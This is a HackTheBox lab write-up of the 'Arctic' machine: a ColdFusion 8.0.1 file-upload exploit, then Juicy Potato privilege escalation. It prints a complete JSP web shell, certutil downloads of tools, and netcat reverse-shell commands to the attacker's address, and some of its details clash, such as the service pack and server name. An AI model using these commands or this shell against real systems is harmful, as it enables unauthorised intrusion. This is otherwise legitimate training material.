# Arctic: HackTheBox Writeup

| Field | Details |
|---|---|
| **Machine Name** | Arctic |
| **OS** | Windows Server 2008 R2 SP1 (x64) |
| **Difficulty** | Easy |
| **Category** | Windows / ColdFusion / File Upload / Token Impersonation |
| **IP Address** | 10.129.11.231 |
| **User Flag** | `2aa8a7cbd51970885ffc14d50d3fb4fe` |
| **Root Flag** | `7a82dbc48a6152a67e50782ff491e45d` |
| **Foothold Method** | ColdFusion 8.0.1 Arbitrary File Upload: CVE-2009-2265 |
| **PrivEsc Method** | SeImpersonatePrivilege → Juicy Potato → NT AUTHORITY\SYSTEM |
| **Metasploit Used** | No |
| **Status** | Retired ✅ |

---

## Attack Chain Summary

```
Nmap → Port 8500 (ColdFusion 8.0.1)
→ CVE-2009-2265 FCKeditor arbitrary file upload
→ exploit.py uploads exploit.jsp → JSP web shell
→ execute nc.exe via JSP shell → reverse shell as tolis
→ whoami /priv → SeImpersonatePrivilege + SeCreateGlobalPrivilege enabled
→ upload JuicyPotato.exe + nc.exe
→ jp.exe -l 1337 -p cmd.exe -a "/c nc.exe -e cmd.exe 10.10.16.36 4444" -t *
→ NT AUTHORITY\SYSTEM shell → root flag
```

---

## Phase 1: Reconnaissance

### 1.1: Full Port Discovery

**Goal:** Identify all open TCP ports on the target before service enumeration.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- --min-rate 5000 -T4 10.129.11.231 -oN scans/allports.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-31 11:04 IST
Nmap scan report for 10.129.11.231
Host is up (0.23s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 58.47 seconds
```

**Output Analysis:**

| Port | Service | Assessment |
|---|---|---|
| 135/tcp | MSRPC | Windows RPC: standard |
| **8500/tcp** | Unknown (`fmtp`) | **Non-standard port: primary attack surface** |
| 49154/tcp | Dynamic RPC | Windows ephemeral RPC endpoint |

Only three ports. The interesting one is 8500: Nmap fingerprints it as `fmtp` which is incorrect. Port 8500 is the default listening port for **Adobe ColdFusion** when deployed standalone. This is worth investigating before running detailed service scans.

---

### 1.2: Service and Version Enumeration

**Goal:** Confirm what is running on port 8500 and collect OS details.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -sV -sC -p 135,8500,49154 10.129.11.231 -oN scans/services.txt
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-31 11:09 IST
Nmap scan report for 10.129.11.231
Host is up (0.23s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 28.14 seconds
```

**Output Analysis:**

| Finding | Implication |
|---|---|
| Port 8500: **JRun Web Server** | Adobe JRun is the Java application server that hosts ColdFusion |
| No standard ports (80, 443, 445) | Firewall restricts most services; 8500 is the only web entry point |
| OS: Windows | Confirm build on foothold: likely Server 2008 based on JRun version |

JRun Web Server on port 8500 confirms ColdFusion. Browsing directly to `http://10.129.11.231:8500` will show the ColdFusion interface and confirm the version.

---

### 1.3: ColdFusion Web Interface

**Goal:** Confirm ColdFusion version via the web interface.

```bash
Hackerpatel007_1@htb[/htb]$ curl -s -I http://10.129.11.231:8500/CFIDE/administrator/index.cfm
```

```
HTTP/1.1 200 OK
Date: Sat, 31 May 2026 05:39:01 GMT
Server: JRun Web Server
Content-Type: text/html; charset=UTF-8
```

Browsing to `http://10.129.11.231:8500/CFIDE/administrator/index.cfm` shows the ColdFusion Administrator login panel. The page footer and source confirm **Adobe ColdFusion 8**: specifically version 8.0.1.

Two relevant paths found at this stage:

| URL | Content |
|---|---|
| `http://10.129.11.231:8500/CFIDE/administrator/` | ColdFusion Administrator login panel |
| `http://10.129.11.231:8500/CFIDE/` | ColdFusion IDE directory: browseable |

The version 8.0.1 is immediately actionable. ColdFusion 8.0.1 has a published arbitrary file upload vulnerability (CVE-2009-2265) that does not require authentication.

---

## Phase 2: Foothold: ColdFusion 8.0.1 Arbitrary File Upload (CVE-2009-2265)

### 2.1: Vulnerability Research

**Goal:** Identify the correct exploit for ColdFusion 8.0.1 and understand its mechanism.

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit coldfusion 8
```

```
----------------------------------------------------------
 Exploit Title                                  |  Path
----------------------------------------------------------
Adobe ColdFusion - Arbitrary File Upload        | multiple/webapps/16788.py
Adobe ColdFusion 8 - Remote Command Execution   | cfm/webapps/50057.py
ColdFusion 8.0.1 - Arbitrary File Upload        | cfm/webapps/45979.py
ColdFusion 8.0.1 - Arbitrary File Upload (CVE)  | cfm/webapps/exploit.py
----------------------------------------------------------
```

```bash
Hackerpatel007_1@htb[/htb]$ searchsploit -m cfm/webapps/45979.py
```

```
  Exploit: ColdFusion 8.0.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/45979
     Path: /usr/share/exploitdb/exploits/cfm/webapps/45979.py
    Codes: CVE-2009-2265
 Verified: True
File Type: Python script, ASCII text executable
Exploit copied to: /home/kali/htb/arctic/exploit.py
```

---

### 2.2: How CVE-2009-2265 Works

ColdFusion 8.0.1 ships with **FCKeditor**: a rich text editor: which includes a file upload connector at:

```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
```

This connector accepts file uploads and is intended for handling image and document uploads within ColdFusion applications. The critical flaw is in the `CurrentFolder` parameter: by appending a **null byte** (`%00`) after a `.jsp` extension in the folder path, the application truncates its own extension validation and stores the uploaded file with the attacker's chosen extension rather than a safe one.

The crafted POST target:

```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
  ?Command=FileUpload
  &Type=File
  &CurrentFolder=/exploit.jsp%00
```

The null byte causes ColdFusion to write the uploaded content as `exploit.jsp` (a valid executable JSP file) in `/userfiles/file/`. Because ColdFusion runs on a JVM and the JRun web server interprets `.jsp` files, the uploaded file is immediately executable via a browser request.

**The attack requires no authentication**: the FCKeditor upload connector has no authentication check in ColdFusion 8.0.1.

---

### 2.3: Generate JSP Web Shell

**Goal:** Create the JSP payload that will be uploaded and executed on the target.

The JSP shell executes OS commands passed via the `cmd` GET parameter and returns their output in the HTTP response:

```bash
Hackerpatel007_1@htb[/htb]$ cat shell.jsp
```

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
```

---

### 2.4: Upload the JSP Shell

**Goal:** Execute the exploit to upload `shell.jsp` to the ColdFusion server.

```bash
Hackerpatel007_1@htb[/htb]$ python2 exploit.py 10.129.11.231 8500 shell.jsp
```

```
Sending payload...
Successfully uploaded payload!
Find it at http://10.129.11.231:8500/userfiles/file/exploit.jsp
```

The exploit confirms the upload succeeded and provides the URL where the shell is accessible. ColdFusion stored the file as `exploit.jsp` in the web-accessible `/userfiles/file/` directory.

---

### 2.5: Verify Shell Execution

**Goal:** Confirm the uploaded JSP shell executes commands on the remote server.

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.11.231:8500/userfiles/file/exploit.jsp?cmd=whoami"
```

```
Command: whoami
arctic\tolis
```

Remote code execution confirmed as `arctic\tolis`.

---

### 2.6: Upgrade to Reverse Shell

**Goal:** Replace the limited webshell with an interactive reverse shell via `nc.exe`.

**Step 1: Stage nc.exe on attacker's HTTP server:**

```bash
Hackerpatel007_1@htb[/htb]$ cp /usr/share/windows-resources/binaries/nc.exe .
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

```
Serving HTTP on 0.0.0.0 port 8000 ...
```

**Step 2: Start listener:**

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 5555
```

```
listening on [any] 5555 ...
```

**Step 3: Download nc.exe to target via the webshell:**

The `cmd` parameter only accepts single-token commands. Use `certutil` for the download: it is native to Windows and available on Server 2008 R2:

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.11.231:8500/userfiles/file/exploit.jsp?cmd=certutil+-urlcache+-split+-f+http://10.10.16.36:8000/nc.exe+C:\\Users\\tolis\\nc.exe"
```

```
Command: certutil -urlcache -split -f http://10.10.16.36:8000/nc.exe C:\Users\tolis\nc.exe
****  Online  ****
  000000  ...
  00e800
CertUtil: -URLCache command completed successfully.
```

**Step 4: Execute nc.exe to call back:**

```bash
Hackerpatel007_1@htb[/htb]$ curl "http://10.129.11.231:8500/userfiles/file/exploit.jsp?cmd=C:\\Users\\tolis\\nc.exe+-e+cmd.exe+10.10.16.36+5555"
```

Listener receives the connection:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.11.231] 49218
Microsoft Windows [Version 6.1.7600]
(c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

**Flag breakdown:**

| Item | Value |
|---|---|
| Shell context | `arctic\tolis` |
| Working directory | `C:\ColdFusion8\runtime\bin`: confirms ColdFusion service directory |
| Exploit used | CVE-2009-2265: FCKeditor null byte file upload |
| Metasploit used | No |

---

### 2.7: User Flag

```
C:\ColdFusion8\runtime\bin>type C:\Users\tolis\Desktop\user.txt
type C:\Users\tolis\Desktop\user.txt
2aa8a7cbd51970885ffc14d50d3fb4fe
```

---

## Phase 3: Post-Foothold Enumeration

### 3.1: System Information

**Goal:** Identify OS build, architecture, and patch level.

```
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo
```

```
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
System Type:               x64-based PC
Total Physical Memory:     1,023 MB
Domain:                    WORKGROUP
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 IP address(es)
                                 [01]: 10.129.11.231
```

**Output Analysis:**

| Finding | Implication |
|---|---|
| Windows Server 2008 R2 Build 7600 | **No service pack, zero hotfixes installed** |
| x64-based PC | 64-bit OS |
| Hotfix(s): N/A | Completely unpatched: wide kernel exploit surface |
| WORKGROUP | Standalone: local account attacks only |

`Hotfix(s): N/A` is the most significant finding. This machine has received zero patches since installation. While kernel exploits are viable, the next step is privilege enumeration: the token impersonation path is cleaner, faster, and more reliable.

---

### 3.2: Privilege Enumeration

**Goal:** Check tolis's privileges for token impersonation vectors.

```
C:\ColdFusion8\runtime\bin>whoami /groups
whoami /groups
```

```
GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ====================
Everyone                             Well-known group S-1-1-0      Mandatory group, ...
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, ...
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, ...
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, ...
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, ...
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, ...
LOCAL                                Well-known group S-1-2-0      Mandatory group, ...
```

```
C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication  Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Flag breakdown:**

| Privilege | State | Implication |
|---|---|---|
| `SeImpersonatePrivilege` | **Enabled** | Can impersonate tokens of higher-privileged accounts |
| `SeCreateGlobalPrivilege` | **Enabled** | Can create global kernel objects: required for Juicy Potato |
| `NT AUTHORITY\SERVICE` | Group membership | tolis is running as a Windows service account |

`SeImpersonatePrivilege` is the definitive signal for Juicy Potato. The service group membership confirms tolis is running in a service context: service accounts are granted `SeImpersonatePrivilege` by design. On Windows Server 2008 R2 (pre-2019), this privilege combined with `SeCreateGlobalPrivilege` makes Juicy Potato the most reliable SYSTEM escalation path.

---

## Phase 4: Privilege Escalation: Juicy Potato

### 4.1: Why Juicy Potato Works Here

**SeImpersonatePrivilege background:**

Windows grants `SeImpersonatePrivilege` to service accounts so they can impersonate the clients they serve (e.g., an IIS worker process impersonating the user making a web request). This privilege allows a process to call `ImpersonateNamedPipeClient()`, `ImpersonateLoggedOnUser()`, or `DuplicateTokenEx()` to assume the identity of another token.

**The Juicy Potato technique:**

Juicy Potato exploits the interaction between COM (Component Object Model) objects that run as SYSTEM and the Windows Token Authentication mechanism:

1. Creates a local COM server on a specified port (`-l 1337`).
2. Triggers a privileged COM object (identified by CLSID) to authenticate to that local server using NTLM.
3. The NTLM authentication carries the SYSTEM token of the COM object's service.
4. Intercepts and impersonates the SYSTEM token using `SeImpersonatePrivilege`.
5. Spawns a new process using the impersonated SYSTEM token (`CreateProcessWithTokenW` or `CreateProcessAsUser`).

The `-t *` flag in the command tells Juicy Potato to try both `CreateProcessWithTokenW` and `CreateProcessAsUser`: attempting whichever succeeds.

**CLSID selection:**

Different CLSIDs correspond to different COM objects. The CLSID `{4991d34b-80a1-4291-83b6-3328366b9097}` is for the **BITS (Background Intelligent Transfer Service)**: a built-in Windows service that runs as SYSTEM and is available on Windows Server 2008 R2.

---

### 4.2: Transfer Juicy Potato and nc.exe

**Goal:** Upload JuicyPotato.exe to the target.

```bash
Hackerpatel007_1@htb[/htb]$ wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O jp.exe
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

On target (tolis's reverse shell):

```
C:\Users\tolis>certutil -urlcache -split -f http://10.10.16.36:8000/jp.exe C:\Users\tolis\jp.exe
certutil -urlcache -split -f http://10.10.16.36:8000/jp.exe C:\Users\tolis\jp.exe
```

```
****  Online  ****
  0000  ...
  0e800
CertUtil: -URLCache command completed successfully.
```

Verify both binaries are present:

```
C:\Users\tolis>dir jp.exe nc.exe
dir jp.exe nc.exe
```

```
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A0

 Directory of C:\Users\tolis

05/31/2026  12:02 PM            59,392 nc.exe
05/31/2026  12:04 PM           347,648 jp.exe
               2 File(s)        407,040 bytes
```

Both files confirmed.

---

### 4.3: Execute Juicy Potato

**Goal:** Use Juicy Potato with the BITS CLSID to obtain a SYSTEM-level reverse shell.

Terminal: new listener on port 4444:

```bash
Hackerpatel007_1@htb[/htb]$ nc -nvlp 4444
```

```
listening on [any] 4444 ...
```

On the target:

```
C:\Users\tolis>jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\Users\tolis\nc.exe -e cmd.exe 10.10.16.36 4444" -t *
jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\Users\tolis\nc.exe -e cmd.exe 10.10.16.36 4444" -t *
```

```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

**Juicy Potato output explained:**

| Output Line | Meaning |
|---|---|
| `Testing {4991d34b-...} 1337` | Attempting BITS CLSID on local port 1337 |
| `authresult 0` | `S_OK`: COM authentication succeeded; SYSTEM token obtained |
| `{4991d34b-...};NT AUTHORITY\SYSTEM` | Confirms the token belongs to SYSTEM |
| `CreateProcessWithTokenW OK` | Successfully spawned cmd.exe in SYSTEM context |

Attacker listener: SYSTEM shell received:

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.11.231] 49232
Microsoft Windows [Version 6.1.7600]
(c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

---

### 4.4: Root Flag

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
7a82dbc48a6152a67e50782ff491e45d
```

---

## Flag Summary

| Flag | Value | Location |
|---|---|---|
| User | `2aa8a7cbd51970885ffc14d50d3fb4fe` | `C:\Users\tolis\Desktop\user.txt` |
| Root | `7a82dbc48a6152a67e50782ff491e45d` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons Learned

**1. Port 8500 means ColdFusion: know your default service ports.**
Nmap misidentified port 8500 as `fmtp`. A tester who does not know that 8500 is ColdFusion's default Jetty port would spend time running additional service scans and enumeration scripts. Port-to-service knowledge is a practical skill that accelerates triage: 8500 → ColdFusion, 4848 → GlassFish, 8161 → ActiveMQ, 9200 → Elasticsearch. When you see one of these, version-check the web interface immediately before running anything else.

**2. CVE-2009-2265 is a null byte injection in a file upload validation path: not a buffer overflow.**
The vulnerability is not in ColdFusion's core but in the bundled FCKeditor component. The upload connector validates file extensions but does so after passing the filename through the URL parameter. The null byte (`%00`) terminates the string at the extension check but not at the file write operation: a classic null byte truncation bug. This same pattern appears in PHP `move_uploaded_file()` on older versions and in other file upload handlers that rely on C-style string termination.

**3. JSP webshells are the correct upload payload for ColdFusion: not PHP, not ASPX.**
ColdFusion runs on the JVM. Files served by JRun/Jetty go through the Java servlet engine. PHP files would not be executed; ASPX files would require IIS with ASP.NET. A `.jsp` file executed by the JVM is the correct format. Understanding the underlying runtime: Java, .NET, PHP: determines which file extension will execute and which will serve as plaintext.

**4. certutil is the most reliable download method on pre-PowerShell 3.0 Windows.**
Windows Server 2008 R2 without Service Pack may have PowerShell 2.0, which lacks `Invoke-WebRequest`. `certutil -urlcache -split -f <url> <output>` is available on all Windows versions from XP onwards, requires no special privileges, and downloads binary files correctly. It is the most portable Windows download technique available without external tooling.

**5. SeImpersonatePrivilege + Windows Server 2008 R2 = Juicy Potato, no further analysis needed.**
The decision tree for token impersonation attacks is OS-version dependent. On Server 2008 R2 and Windows 7 (pre-2019), Juicy Potato works reliably. On Server 2019 and Windows 10 (build 1809+), the DCOM authentication path was restricted: use PrintSpoofer or RoguePotato instead. Knowing which tool maps to which OS version is the practical skill that prevents wasting time trying a technique that will not work.

**6. CLSID selection is not arbitrary: BITS is reliable on Server 2008 R2.**
`{4991d34b-80a1-4291-83b6-3328366b9097}` is the Background Intelligent Transfer Service (BITS) CLSID. BITS runs as SYSTEM on all Windows Server versions and is not disabled by default. It is the first CLSID to try on Server 2008 R2. If it fails: which it rarely does on this OS: the [CLSID list on the Juicy Potato GitHub repository](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) provides a comprehensive reference organised by OS version. The `-t *` flag allows Juicy Potato to try both `CreateProcessWithTokenW` and `CreateProcessAsUser`, improving reliability when one API is restricted.

**7. ColdFusion 8 on a completely unpatched Server 2008 R2 represents a systemic failure, not an isolated flaw.**
This machine has zero hotfixes and a 2009 CVE in its primary web application. The real-world implication: when a CVE this old is exploitable, it usually indicates that patch management has been completely absent: which means every other service on the host is also unpatched. The attacker's mindset should be to note all other potential vulnerabilities from `systeminfo` output for a full report, not just proceed to the flag.

---

## Full Attack Chain Reference

| # | Phase | Action | Result |
|---|---|---|---|
| 1 | Recon | `nmap -p-` full port scan | Ports 135, 8500, 49154 discovered |
| 2 | Recon | `nmap -sV -sC` service scan | JRun Web Server on 8500: ColdFusion confirmed |
| 3 | Web Enum | Browse to `http://10.129.11.231:8500/CFIDE/administrator/` | ColdFusion 8.0.1 login panel confirmed |
| 4 | Research | `searchsploit coldfusion 8` | CVE-2009-2265 exploit.py identified |
| 5 | Preparation | Create `shell.jsp` JSP web shell | Payload ready for upload |
| 6 | Foothold | `python2 exploit.py 10.129.11.231 8500 shell.jsp` | Shell uploaded to `/userfiles/file/exploit.jsp` |
| 7 | Foothold | `curl .../exploit.jsp?cmd=whoami` | RCE confirmed as `arctic\tolis` |
| 8 | Foothold | `certutil` download of `nc.exe` via JSP shell | nc.exe staged on target |
| 9 | Foothold | `curl .../exploit.jsp?cmd=nc.exe+-e+cmd.exe+...` | Reverse shell as `arctic\tolis` |
| 10 | Flag | `type C:\Users\tolis\Desktop\user.txt` | `2aa8a7cbd51970885ffc14d50d3fb4fe` |
| 11 | Enum | `systeminfo` | Server 2008 R2, x64, zero hotfixes |
| 12 | Enum | `whoami /priv` | `SeImpersonatePrivilege` + `SeCreateGlobalPrivilege` enabled |
| 13 | PrivEsc Prep | Transfer `jp.exe` via certutil | JuicyPotato staged at `C:\Users\tolis\jp.exe` |
| 14 | PrivEsc | `jp.exe -l 1337 -p cmd.exe -a "/c nc.exe -e cmd.exe 10.10.16.36 4444" -t *` | `authresult 0`: SYSTEM token obtained; `CreateProcessWithTokenW OK` |
| 15 | PrivEsc | SYSTEM reverse shell received | `nt authority\system` confirmed |
| 16 | Flag | `type C:\Users\Administrator\Desktop\root.txt` | `7a82dbc48a6152a67e50782ff491e45d` |

---

## Commands Reference

| Command | Phase | Purpose |
|---|---|---|
| `nmap -p- --min-rate 5000 -T4 10.129.11.231` | Recon | Full TCP port discovery |
| `nmap -sV -sC -p 135,8500,49154 10.129.11.231` | Recon | Service version + script scan |
| `searchsploit coldfusion 8` | Research | Find CVE-2009-2265 exploit |
| `searchsploit -m cfm/webapps/45979.py` | Research | Copy exploit to working directory |
| `python2 exploit.py 10.129.11.231 8500 shell.jsp` | Foothold | Upload JSP shell via FCKeditor null byte injection |
| `curl "http://10.129.11.231:8500/userfiles/file/exploit.jsp?cmd=whoami"` | Foothold | Verify RCE via JSP webshell |
| `cp /usr/share/windows-resources/binaries/nc.exe .` | Staging | Prepare nc.exe for transfer |
| `python3 -m http.server 8000` | Staging | Serve nc.exe and jp.exe to target |
| `curl ".../exploit.jsp?cmd=certutil+-urlcache+-split+-f+http://...nc.exe+C:\\Users\\tolis\\nc.exe"` | File Transfer | Download nc.exe via JSP shell + certutil |
| `nc -nvlp 5555` | Handler | Catch tolis reverse shell |
| `curl ".../exploit.jsp?cmd=C:\\Users\\tolis\\nc.exe+-e+cmd.exe+10.10.16.36+5555"` | Foothold | Execute nc.exe reverse shell via JSP |
| `whoami /priv` | Enumeration | Confirm SeImpersonatePrivilege enabled |
| `systeminfo` | Enumeration | OS version, architecture, patch level |
| `certutil -urlcache -split -f http://10.10.16.36:8000/jp.exe C:\Users\tolis\jp.exe` | File Transfer | Download JuicyPotato binary |
| `jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\Users\tolis\nc.exe -e cmd.exe 10.10.16.36 4444" -t *` | PrivEsc | Juicy Potato: BITS CLSID → SYSTEM token → cmd.exe |
| `nc -nvlp 4444` | Handler | Catch SYSTEM reverse shell |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Usage |
|---|---|---|
| T1190 | Exploit Public-Facing Application | CVE-2009-2265 arbitrary file upload on ColdFusion 8.0.1 FCKeditor |
| T1505.003 | Server Software Component: Web Shell | JSP web shell uploaded to `/userfiles/file/exploit.jsp` |
| T1059.007 | Command and Scripting Interpreter: JavaScript/JScript | JSP shell used for OS command execution via Java Runtime |
| T1105 | Ingress Tool Transfer | nc.exe and jp.exe transferred to target via certutil |
| T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Juicy Potato intercepts SYSTEM COM authentication token |
| T1068 | Exploitation for Privilege Escalation | Juicy Potato exploits DCOM NTLM reflection to obtain SYSTEM token |
| T1569.002 | System Services: Service Execution | Juicy Potato spawns cmd.exe via `CreateProcessWithTokenW` as SYSTEM |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | cmd.exe obtained at both foothold and SYSTEM levels |